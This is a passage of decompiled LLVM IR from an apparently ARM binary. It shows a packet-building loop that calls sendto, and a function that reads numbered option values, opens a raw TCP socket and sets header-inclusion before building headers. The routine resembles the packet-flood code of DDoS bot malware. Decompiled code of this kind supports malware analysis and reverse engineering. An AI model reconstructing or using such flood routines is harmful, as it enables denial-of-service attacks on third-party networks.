  %v4_cbc4 = inttoptr i32 %v3_cbc4 to i8*
  store i8 %v1_cbc4, i8* %v4_cbc4, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cbcc = load i32, i32* @r4, align 4
  store i32 %v0_cbcc, i32* @r0, align 4
  %v2_cbd0 = call i32 @function_f19c(i32 %v0_cbcc, i32 20)
  %v3_cbd0 = trunc i32 %v2_cbd0 to i8
  store i32 %v2_cbd0, i32* %r0.global-to-local, align 4
  %v3_cbd4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_c4a0, i32* %r2.global-to-local, align 4
  %v3_cbdc = mul i32 %v3_cbd4, 16
  %v2_cbe0 = add i32 %v3_cbdc, %v2_c4a0
  store i32 %v2_cbe0, i32* %r1.global-to-local, align 4
  %v1_cbe4 = add i32 %v2_cbe0, 4
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i32*
  %v3_cbe4 = load i32, i32* %v2_cbe4, align 4
  %v3_cbe8 = mul i32 %v3_cbe4, 65536
  store i32 %v3_cbe8, i32* %ip.global-to-local, align 4
  %tmp100 = mul i32 %v3_cbe4, 256
  %v1_cbf0 = and i32 %tmp100, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %tmp101 = udiv i32 %v3_cbe4, 256
  %v4_cbf4 = urem i32 %tmp101, 256
  %v5_cbf4 = or i32 %v4_cbf4, %v1_cbf0
  store i32 %v5_cbf4, i32* %r2.global-to-local, align 4
  %v1_cbf8 = add i32 %v3_cbe4, 1
  store i32 %v1_cbf8, i32* %r3.global-to-local, align 4
  store i32 %v1_cbf8, i32* %v2_cbe4, align 4
  %v0_cc00 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc00 = load i32, i32* @r5, align 4
  %v2_cc00 = add i32 %v1_cc00, 4
  %v3_cc00 = inttoptr i32 %v2_cc00 to i32*
  store i32 %v0_cc00, i32* %v3_cc00, align 4
  %v0_cc04 = load i32, i32* %r1.global-to-local, align 4
  %v1_cc04 = add i32 %v0_cc04, 8
  %v2_cc04 = inttoptr i32 %v1_cc04 to i32*
  %v3_cc04 = load i32, i32* %v2_cc04, align 4
  %tmp102 = mul i32 %v3_cc04, 256
  %v1_cc10 = and i32 %tmp102, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %tmp103 = udiv i32 %v3_cc04, 256
  %v4_cc14 = urem i32 %tmp103, 256
  %v5_cc14 = or i32 %v4_cc14, %v1_cc10
  store i32 %v5_cc14, i32* %r2.global-to-local, align 4
  %v4_cc1838 = udiv i32 %v2_cbd0, 256
  %v1_cc1c = trunc i32 %v4_cc1838 to i8
  %v2_cc1c = load i32, i32* @r4, align 4
  %v3_cc1c = add i32 %v2_cc1c, 11
  %v4_cc1c = inttoptr i32 %v3_cc1c to i8*
  store i8 %v1_cc1c, i8* %v4_cc1c, align 1
  %v3_cc20 = load i32, i32* @r4, align 4
  %v4_cc20 = add i32 %v3_cc20, 10
  %v5_cc20 = inttoptr i32 %v4_cc20 to i8*
  store i8 %v3_cbd0, i8* %v5_cc20, align 1
  %v0_cc24 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc24 = load i32, i32* @r5, align 4
  %v2_cc24 = add i32 %v1_cc24, 8
  %v3_cc24 = inttoptr i32 %v2_cc24 to i32*
  store i32 %v0_cc24, i32* %v3_cc24, align 4
  %v0_cc28 = load i32, i32* @r5, align 4
  store i32 %v0_cc28, i32* @r1, align 4
  %v0_cc2c = load i32, i32* @r8, align 4
  store i32 %v0_cc2c, i32* %r2.global-to-local, align 4
  %v0_cc30 = load i32, i32* @r7, align 4
  store i32 %v0_cc30, i32* %r3.global-to-local, align 4
  %v0_cc34 = load i32, i32* @r4, align 4
  store i32 %v0_cc34, i32* %r0.global-to-local, align 4
  %v0_cc38 = load i32, i32* @r6, align 4
  %v1_cc38 = trunc i32 %v0_cc38 to i8
  %v3_cc38 = add i32 %v0_cc28, 16
  %v4_cc38 = inttoptr i32 %v3_cc38 to i8*
  store i8 %v1_cc38, i8* %v4_cc38, align 1
  %v0_cc3c = load i32, i32* @r6, align 4
  %v1_cc3c = trunc i32 %v0_cc3c to i8
  %v2_cc3c = load i32, i32* @r5, align 4
  %v3_cc3c = add i32 %v2_cc3c, 17
  %v4_cc3c = inttoptr i32 %v3_cc3c to i8*
  store i8 %v1_cc3c, i8* %v4_cc3c, align 1
  %v4_cc40 = call i32 @function_f1f8(i32 %v0_cc34, i32 %v0_cc28, i32 %v0_cc2c, i32 %v0_cc30)
  %v5_cc40 = trunc i32 %v4_cc40 to i8
  store i32 %v4_cc40, i32* %r0.global-to-local, align 4
  %v4_cc4439 = udiv i32 %v4_cc40, 256
  %v1_cc48 = trunc i32 %v4_cc4439 to i8
  %v2_cc48 = load i32, i32* @r5, align 4
  %v3_cc48 = add i32 %v2_cc48, 17
  %v4_cc48 = inttoptr i32 %v3_cc48 to i8*
  store i8 %v1_cc48, i8* %v4_cc48, align 1
  %v3_cc4c = load i32, i32* @r5, align 4
  %v4_cc4c = add i32 %v3_cc4c, 16
  %v5_cc4c = inttoptr i32 %v4_cc4c to i8*
  store i8 %v5_cc40, i8* %v5_cc4c, align 1
  %v3_cc50 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cc50, i32* %r3.global-to-local, align 4
  %v0_cc54 = load i32, i32* @r4, align 4
  %v1_cc54 = add i32 %v0_cc54, 20
  %v2_cc54 = inttoptr i32 %v1_cc54 to i32*
  %v3_cc54 = load i32, i32* %v2_cc54, align 4
  %v5_cc5c = mul i32 %v3_cc50, 24
  %v3_cc64 = udiv i32 %v3_cc54, 65536
  store i32 %v3_cc64, i32* %r2.global-to-local, align 4
  %v2_cc68 = add i32 %v5_cc5c, %arg2
  store i32 %v2_cc68, i32* %ip.global-to-local, align 4
  %v3_cc6c7 = udiv i32 %v3_cc54, 16777216
  %v1_cc70 = trunc i32 %v3_cc6c7 to i8
  %v3_cc70 = add i32 %v2_cc68, 3
  %v4_cc70 = inttoptr i32 %v3_cc70 to i8*
  store i8 %v1_cc70, i8* %v4_cc70, align 1
  %v0_cc74 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc74 = trunc i32 %v0_cc74 to i8
  %v2_cc74 = load i32, i32* %ip.global-to-local, align 4
  %v3_cc74 = add i32 %v2_cc74, 2
  %v4_cc74 = inttoptr i32 %v3_cc74 to i8*
  store i8 %v1_cc74, i8* %v4_cc74, align 1
  %v0_cc78 = load i32, i32* @r4, align 4
  store i32 %v0_cc78, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c650, i32* %r0.global-to-local, align 4
  %v0_cc84 = load i32, i32* @sl, align 4
  store i32 %v0_cc84, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_cc8c = load i32, i32* %ip.global-to-local, align 4
  %v4_cc8c = inttoptr i32 %v0_cc8c to %sockaddr*
  %v7_cc94 = inttoptr i32 %v0_cc78 to i32*
  %v9_cc94 = call i32 @sendto(i32 %v3_c650, i32* %v7_cc94, i32 %v0_cc84, i32 16384, %sockaddr* %v4_cc8c, i32 16)
  %v3_cc98 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cc98, i32* %r3.global-to-local, align 4
  %v1_cc9c = add i32 %v3_cc98, 1
  store i32 %v1_cc9c, i32* %r0.global-to-local, align 4
  %v1_cca0 = load i32, i32* @fp, align 4
  %v9_cca0 = icmp eq i32 %v1_cc9c, %v1_cca0
  store i1 %v9_cca0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cc9c, i32* %stack_var_-40, align 4
  %v6_cca8 = icmp slt i32 %v1_cc9c, %v1_cca0
  br i1 %v6_cca8, label %dec_label_pc_ccac, label %dec_label_pc_cb64

dec_label_pc_ccac:                                ; preds = %dec_label_pc_cbc0
  store i32 %v2_c4b0, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_c698, i32* %ip.global-to-local, align 4
  %v4_ccb8 = mul i32 %v1_cc9c, 4
  %v5_ccb8 = add i32 %v4_ccb8, %v2_c4b0
  %v6_ccb8 = inttoptr i32 %v5_ccb8 to i32*
  %v7_ccb8 = load i32, i32* %v6_ccb8, align 4
  store i32 %v7_ccb8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_cb98, i1* %cpsr_z.global-to-local, align 1
  %v1_ccc4 = add i32 %v7_ccb8, 20
  store i32 %v1_ccc4, i32* @r5, align 4
  br i1 %v3_cb98, label %dec_label_pc_cccc, label %dec_label_pc_cbac

dec_label_pc_cccc:                                ; preds = %dec_label_pc_ccac, %dec_label_pc_cb70
  %v0_cccc = call i32 @function_10bd8()
  %v1_cccc = trunc i32 %v0_cccc to i8
  %v4_ccd0 = sdiv i32 %v0_cccc, 256
  store i32 %v4_ccd0, i32* %r3.global-to-local, align 4
  %v3_ccd4 = load i32, i32* @r4, align 4
  %v4_ccd4 = add i32 %v3_ccd4, 4
  %v5_ccd4 = inttoptr i32 %v4_ccd4 to i8*
  store i8 %v1_cccc, i8* %v5_ccd4, align 1
  store i1 %v2_ccdc, i1* %cpsr_z.global-to-local, align 1
  %v0_cce0 = load i32, i32* %r3.global-to-local, align 4
  %v1_cce0 = trunc i32 %v0_cce0 to i8
  %v2_cce0 = load i32, i32* @r4, align 4
  %v3_cce0 = add i32 %v2_cce0, 5
  %v4_cce0 = inttoptr i32 %v3_cce0 to i8*
  store i8 %v1_cce0, i8* %v4_cce0, align 1
  %v0_cce4 = load i32, i32* @r4, align 4
  %v1_cce4 = add i32 %v0_cce4, 40
  store i32 %v1_cce4, i32* %r0.global-to-local, align 4
  %v0_cce8 = load i32, i32* @sb, align 4
  store i32 %v0_cce8, i32* @r1, align 4
  %v0_ccec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ccec, label %dec_label_pc_cbc0, label %dec_label_pc_ccf0

dec_label_pc_ccf0:                                ; preds = %dec_label_pc_cbac, %dec_label_pc_cccc
  %v0_ccf0 = phi i32 [ %v1_cbb8, %dec_label_pc_cbac ], [ %v1_cce4, %dec_label_pc_cccc ]
  %v1_ccf0 = inttoptr i32 %v0_ccf0 to i8*
  %v2_ccf0 = call i32 @function_10db4(i8* %v1_ccf0)
  store i32 %v2_ccf0, i32* %r0.global-to-local, align 4
  %v2_cbc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cbc0

; uselistorder directives
  uselistorder i32 %v0_cce4, { 1, 0 }
  uselistorder i32 %v7_ccb8, { 1, 2, 0 }
  uselistorder i32 %v1_cca0, { 1, 2, 0 }
  uselistorder i32 %v1_cc9c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_cc40, { 0, 2, 1 }
  uselistorder i32 %v0_cc28, { 1, 0, 2 }
  uselistorder i32 %v3_cc04, { 1, 0 }
  uselistorder i32 %v3_cbe4, { 3, 2, 0, 1 }
  uselistorder i32 %v2_cbd0, { 0, 2, 1 }
  uselistorder i32 %v0_cbb8, { 1, 0 }
  uselistorder i32 %v0_cb70, { 1, 0 }
  uselistorder i32 %v0_cb64, { 1, 0 }
  uselistorder i1 %v3_cb98, { 2, 3, 1, 0 }
  uselistorder i1 %v2_ccdc, { 2, 1, 0 }
  uselistorder i32 %v1_cb4c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_caa0, { 0, 2, 1 }
  uselistorder i32 %v3_ca80, { 1, 0 }
  uselistorder i32 %v0_ca54, { 1, 0, 2 }
  uselistorder i32 %v3_ca48, { 1, 0 }
  uselistorder i32 %v1_c9ac, { 1, 0 }
  uselistorder i32 %v0_c9a0, { 1, 2, 0 }
  uselistorder i32 %v3_c964, { 1, 0 }
  uselistorder i32 %v3_c934, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_c908, { 1, 0, 3, 2 }
  uselistorder i32 %v3_c900, { 1, 0 }
  uselistorder i32 %v4_c8e8, { 1, 0 }
  uselistorder i32 %v0_c8e4, { 0, 2, 1 }
  uselistorder i1 %v7_c854, { 1, 0 }
  uselistorder i32 %v7_c84c, { 0, 2, 1, 3 }
  uselistorder i32 %v5_c898, { 1, 0 }
  uselistorder i1 %v9_c87c, { 1, 0 }
  uselistorder i32 %v4_c890, { 1, 0 }
  uselistorder i32 %v4_c88c, { 1, 0 }
  uselistorder i32 %storemerge35, { 0, 2, 1 }
  uselistorder i32 %v8_c784, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c770, { 1, 0 }
  uselistorder i32 %v7_c73c, { 4, 2, 3, 0, 1, 5 }
  uselistorder i1 %v7_c6e8, { 1, 0 }
  uselistorder i32 %v3_c6e4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_cb0c, { 1, 0 }
  uselistorder i32 %v1_caf4, { 1, 0 }
  uselistorder i32 %v1_cadc, { 1, 0 }
  uselistorder i32 %v1_cac4, { 1, 0 }
  uselistorder i32 %v1_caac, { 1, 0 }
  uselistorder i32 %v5_c894, { 1, 0 }
  uselistorder i32 %v3_c7cc108, { 1, 0 }
  uselistorder i1 %v2_c8ac, { 1, 0 }
  uselistorder i32 %v1_c8a8, { 1, 0 }
  uselistorder i32 %v4_c8a4, { 2, 0, 1 }
  uselistorder i32 %v4_c888, { 1, 0 }
  uselistorder i1 %v3_c7b4, { 1, 0 }
  uselistorder i32 %v1_c6c8, { 2, 1, 0 }
  uselistorder i32 %v8_c6a4, { 2, 1, 0 }
  uselistorder i32 %v8_c6a0, { 1, 2, 0 }
  uselistorder i32 %v3_c698, { 1, 2, 3, 0 }
  uselistorder i32 %v0_c694, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c688, { 1, 0 }
  uselistorder i1 %v7_c658, { 1, 0 }
  uselistorder i32 %v3_c654, { 2, 3, 0, 1 }
  uselistorder i32 %v3_c650, { 4, 5, 1, 2, 3, 6, 7, 0, 8 }
  uselistorder i32 %v1_c640, { 1, 0 }
  uselistorder i32 %v1_c5e8, { 1, 0 }
  uselistorder i32 %v1_c5c8, { 1, 0 }
  uselistorder i32 %v1_c5a8, { 1, 0 }
  uselistorder i32 %v1_c588, { 1, 0 }
  uselistorder i32 %v1_c568, { 1, 0 }
  uselistorder i32 %v1_c530, { 1, 0 }
  uselistorder i32 %v2_c4b0, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_c4a0, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_c484, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 20, 12, 13, 14, 15, 16, 17, 18, 19, 24, 21, 22, 23, 25, 27, 26, 29, 28, 32, 30, 33, 31, 35, 34, 36, 37, 39, 38, 40, 44, 41, 42, 43, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder label %dec_label_pc_ccf0, { 1, 0 }
  uselistorder label %dec_label_pc_cbc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb48, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %dec_label_pc_c8dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c814, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_c7a8, { 1, 0 }
}

define i32 @function_ccfc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ccfc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_ccfc = load i32, i32* @r4, align 4
  %v1_cd00 = urem i32 %arg1, 256
  store i32 %v1_cd00, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_cd18 = urem i32 %arg3, 256
  store i32 %v1_cd18, i32* @r4, align 4
  %v2_cd1c = call i32 @_calloc(i32 %v1_cd00, i32 4)
  %v0_cd20 = load i32, i32* @r5, align 4
  store i32 %v0_cd20, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cd30 = load i32, i32* @r4, align 4
  %v5_cd34 = inttoptr i32 %v0_cd20 to i32*
  %v6_cd34 = call i32 @function_b240(i32 %v0_cd30, i32* %v5_cd34, i32 2, i32 0)
  %v1_cd40 = urem i32 %v6_cd34, 256
  store i32 %v1_cd40, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cd4c = load i32, i32* @r5, align 4
  store i32 %v0_cd4c, i32* %r1.global-to-local, align 4
  %v0_cd50 = load i32, i32* @r4, align 4
  %v5_cd54 = trunc i32 %v6_cd34 to i8
  %v6_cd58 = inttoptr i32 %v0_cd4c to i32*
  %v7_cd58 = call i32 @function_b240(i32 %v0_cd50, i32* %v6_cd58, i32 3, i32 65535)
  %v0_cd5c = load i32, i32* @r5, align 4
  store i32 %v0_cd5c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_cd58, i32* @r8, align 4
  %v0_cd6c = load i32, i32* @r4, align 4
  %v4_cd70 = inttoptr i32 %v0_cd5c to i32*
  %v5_cd70 = call i32 @function_b240(i32 %v0_cd6c, i32* %v4_cd70, i32 4, i32 64)
  %v1_cd78 = urem i32 %v5_cd70, 256
  store i32 %v1_cd78, i32* %ip.global-to-local, align 4
  %v0_cd7c = load i32, i32* @r5, align 4
  store i32 %v0_cd7c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cd88 = load i32, i32* @r4, align 4
  %v6_cd90 = inttoptr i32 %v0_cd7c to i32*
  %v7_cd90 = call i32 @function_b240(i32 %v0_cd88, i32* %v6_cd90, i32 5, i32 0)
  %v1_cd9c = urem i32 %v7_cd90, 256
  store i32 %v1_cd9c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cda8 = load i32, i32* @r5, align 4
  store i32 %v0_cda8, i32* %r1.global-to-local, align 4
  %v0_cdac = load i32, i32* @r4, align 4
  %v5_cdb4 = inttoptr i32 %v0_cda8 to i32*
  %v6_cdb4 = call i32 @function_b240(i32 %v0_cdac, i32* %v5_cdb4, i32 6, i32 65535)
  %v0_cdbc = load i32, i32* @r5, align 4
  store i32 %v0_cdbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_cdb4, i32* @r7, align 4
  %v0_cdcc = load i32, i32* @r4, align 4
  %v4_cdd0 = inttoptr i32 %v0_cdbc to i32*
  %v5_cdd0 = call i32 @function_b240(i32 %v0_cdcc, i32* %v4_cdd0, i32 7, i32 65535)
  %v0_cdd8 = load i32, i32* @r5, align 4
  store i32 %v0_cdd8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_cdd0, i32* @r6, align 4
  %v0_cde8 = load i32, i32* @r4, align 4
  %v4_cdec = inttoptr i32 %v0_cdd8 to i32*
  %v5_cdec = call i32 @function_b240(i32 %v0_cde8, i32* %v4_cdec, i32 17, i32 65535)
  %v0_cdf8 = load i32, i32* @r5, align 4
  store i32 %v0_cdf8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_ce04 = load i32, i32* @r4, align 4
  %v5_ce08 = inttoptr i32 %v0_cdf8 to i32*
  %v6_ce08 = call i32 @function_b240(i32 %v0_ce04, i32* %v5_ce08, i32 18, i32 65535)
  %v0_ce0c = load i32, i32* @r5, align 4
  store i32 %v0_ce0c, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce1c = load i32, i32* @r4, align 4
  %v5_ce20 = inttoptr i32 %v0_ce0c to i32*
  %v6_ce20 = call i32 @function_b240(i32 %v0_ce1c, i32* %v5_ce20, i32 11, i32 0)
  %v0_ce24 = load i32, i32* @r5, align 4
  store i32 %v0_ce24, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ce34 = load i32, i32* @r4, align 4
  %v5_ce38 = inttoptr i32 %v0_ce24 to i32*
  %v6_ce38 = call i32 @function_b240(i32 %v0_ce34, i32* %v5_ce38, i32 12, i32 1)
  %v0_ce3c = load i32, i32* @r5, align 4
  store i32 %v0_ce3c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce4c = load i32, i32* @r4, align 4
  %v5_ce50 = inttoptr i32 %v0_ce3c to i32*
  %v6_ce50 = call i32 @function_b240(i32 %v0_ce4c, i32* %v5_ce50, i32 13, i32 0)
  %v0_ce54 = load i32, i32* @r5, align 4
  store i32 %v0_ce54, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce64 = load i32, i32* @r4, align 4
  %v5_ce68 = inttoptr i32 %v0_ce54 to i32*
  %v6_ce68 = call i32 @function_b240(i32 %v0_ce64, i32* %v5_ce68, i32 14, i32 0)
  %v0_ce6c = load i32, i32* @r5, align 4
  store i32 %v0_ce6c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce7c = load i32, i32* @r4, align 4
  %v5_ce80 = inttoptr i32 %v0_ce6c to i32*
  %v6_ce80 = call i32 @function_b240(i32 %v0_ce7c, i32* %v5_ce80, i32 15, i32 0)
  %v0_ce84 = load i32, i32* @r5, align 4
  store i32 %v0_ce84, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce94 = load i32, i32* @r4, align 4
  %v5_ce98 = inttoptr i32 %v0_ce84 to i32*
  %v6_ce98 = call i32 @function_b240(i32 %v0_ce94, i32* %v5_ce98, i32 16, i32 0)
  %v0_ce9c = load i32, i32* @r5, align 4
  store i32 %v0_ce9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ceac = load i32, i32* @r4, align 4
  %v5_ceb0 = inttoptr i32 %v0_ce9c to i32*
  %v6_ceb0 = call i32 @function_b240(i32 %v0_ceac, i32* %v5_ceb0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cec0 = load i32, i32* @r5, align 4
  store i32 %v0_cec0, i32* %r1.global-to-local, align 4
  %v0_cec4 = load i32, i32* @r4, align 4
  %v4_cec8 = inttoptr i32 %v0_cec0 to i32*
  %v5_cec8 = call i32 @function_b240(i32 %v0_cec4, i32* %v4_cec8, i32 1, i32 1)
  %v2_ced4 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_ced4, i32* %r3.global-to-local, align 4
  %v1_ced8 = urem i32 %v5_cec8, 256
  store i32 %v1_ced8, i32* %ip.global-to-local, align 4
  %v0_cedc = load i32, i32* @r5, align 4
  store i32 %v0_cedc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_cee4 = load i32, i32* @r4, align 4
  %v5_ceec = inttoptr i32 %v0_cedc to i32*
  %v6_ceec = call i32 @function_b1d4(i32 %v0_cee4, i32* %v5_ceec, i32 25, i32 %v2_ced4, i32 %v1_ced8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_cf00 = call i32 @_socket(i32 2, i32 3, i32 6)
  %v7_cf04 = icmp eq i32 %v3_cf00, -1
  store i1 %v7_cf04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cf04, label %dec_label_pc_d33c, label %dec_label_pc_cf10

dec_label_pc_cf10:                                ; preds = %dec_label_pc_ccfc
  store i32 1, i32* %stack_var_-40, align 4
  %v6_cf18 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_cf18, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cf2c = call i32 @_setsockopt()
  %v7_cf30 = icmp eq i32 %v0_cf2c, -1
  store i1 %v7_cf30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cf30, label %dec_label_pc_d334, label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf10
  %v0_cf38 = load i32, i32* @r8, align 4
  %v0_cf3c = load i32, i32* @r7, align 4
  %v0_cf40 = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_cf48 = urem i32 %v0_cf38, 65536
  store i32 %v3_cf48, i32* %r2.global-to-local, align 4
  %v3_cf4c = urem i32 %v0_cf3c, 65536
  store i32 %v3_cf4c, i32* %r3.global-to-local, align 4
  %v3_cf50 = urem i32 %v0_cf40, 65536
  store i32 %v3_cf50, i32* %ip.global-to-local, align 4
  %v0_cf54 = load i32, i32* @fp, align 4
  %v2_cf54 = icmp eq i32 %v0_cf54, 0
  store i1 %v2_cf54, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp76 = icmp slt i32 %v0_cf54, 1
  br i1 %tmp76, label %dec_label_pc_d454, label %dec_label_pc_cf6c

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf38
  %v1_cf74 = add i32 %v6_ceb0, 40
  %tmp77 = mul i32 %v1_cf74, 256
  %v1_cf88 = urem i32 %v0_cf3c, 256
  %v1_cf8c = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %v3_cf90 = mul nuw nsw i32 %v1_cf88, 256
  %v1_cf98 = urem i32 %v0_cf40, 256
  %tmp78 = udiv i32 %v0_cf40, 256
  %v3_cf9c = urem i32 %tmp78, 256
  %tmp79 = udiv i32 %v1_cf74, 256
  %tmp80 = udiv i32 %v0_cf3c, 256
  %v4_cfa4 = urem i32 %tmp80, 256
  %v5_cfa4 = or i32 %v4_cfa4, %v3_cf90
  store i32 %v5_cfa4, i32* @sl, align 4
  %v4_cfa8 = mul nuw nsw i32 %v1_cf98, 256
  %v5_cfa8 = or i32 %v4_cfa8, %v3_cf9c
  store i32 %v5_cfa8, i32* @r6, align 4
  %tmp81 = udiv i32 %v0_cf38, 256
  %v3_cfb8 = urem i32 %tmp81, 256
  %v1_cfbc = urem i32 %v0_cf38, 256
  %tmp82 = mul i32 %v5_cdec, 256
  %v1_cfc4 = and i32 %tmp82, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %v1_cfc8 = urem i32 %v6_ce20, 2
  %v1_cfcc = urem i32 %v6_ce38, 2
  %v1_cfd0 = urem i32 %v6_ce50, 2
  %tmp83 = udiv i32 %v5_cdec, 256
  %v4_cfd4 = urem i32 %tmp83, 256
  %v5_cfd4 = or i32 %v4_cfd4, %v1_cfc4
  store i32 %v5_cfd4, i32* @r8, align 4
  %v1_cff4 = urem i32 %v6_ce68, 2
  %v1_cff8 = urem i32 %v6_ce80, 2
